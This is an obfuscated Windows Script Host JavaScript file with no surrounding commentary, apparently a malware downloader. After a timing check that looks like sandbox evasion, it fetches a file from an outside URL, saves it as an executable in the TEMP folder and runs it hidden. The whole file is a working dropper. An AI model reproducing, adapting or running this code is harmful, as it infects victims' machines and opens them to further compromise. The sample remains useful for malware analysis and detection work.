var ZB = false;
var Q0 = "Create"+"Object";
var J0 = function Q() {return WScript[Q0]("WScript"+".Shell");}(), QD = 11;
var I = "MSXML2"+".XMLHTTP";
var BQ = 2;
var NU = BQ - 2;
function Y(FM){J0["Run"](FM, NU, NU);};
function US(){return I + "";};
function V(V0, X){NU = NU * 1; return V0 - X;};
function WC(){return Q0;};
/*@cc_on
  @if (@_win32 || @_win64)
    ZB = true;
  @end
@*/
if (ZB)
{
var WX = "";
function FE(){return 22;};
var F = 0; var D = 0;
function XL()
{
var JT = new this["Date"]();
var CE = JT["getUTCMilliseconds"]();
WScript["Sleep"](FE());
var JT = new this["Date"]();
var WA = JT["getUTCMilliseconds"]();
WScript["Sleep"](FE());
var JT = new this["Date"]();
var O = JT["getUTCMilliseconds"]();
var F = "Y0";
F = V(WA, CE);
var D = "S";
D = V(O, WA);
WX = "open";
return V(F, D);
}
var L = false;
var E = false;
for (var S0 = NU; S0 < FE() * 1; S0++){if (XL() != NU){
L = true; 
D = "31" + 11 * F + D; 
E = true; 
break;
}}
function J() {return ((L == true) && (L == E)) ? 1 : NU;};
if (L && J() && E){
function CO() {return J0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Kzs5ONQ0r.ex" + "e";};
 A = US();
 W0 = WScript[Q0](A);
 var VP = 1;
do { 
	for (;VP;){
	try {
		if (VP == 1)
		{
			W0[WX]("GET", "http://greenbee.com.ua/b7eosa", false);
			W0["send"]();
			CO0 = "Sleep";
			VP = 2;
		}
		WScript[CO0](FE() + 120); 
		if (W0["readystate"] < 2 * 2) continue;
		VP = NU;
		function Z(W) {var IW = (1, 2, 3, 4, 5, W); return IW;};
		P = WScript[WC()]("ADODB.Stream");
		A = P;
		A[WX]();
		A["type"] = Z(1);
		A["write"](W0["ResponseBody"]);
		P["position"] = Z(NU);
		A["Save" + "ToFile"](CO(), 2);
		P["cl"+"ose"]();
		H = CO();
		Y(H);
	} catch(Y1){};};
}while (VP);
}
}

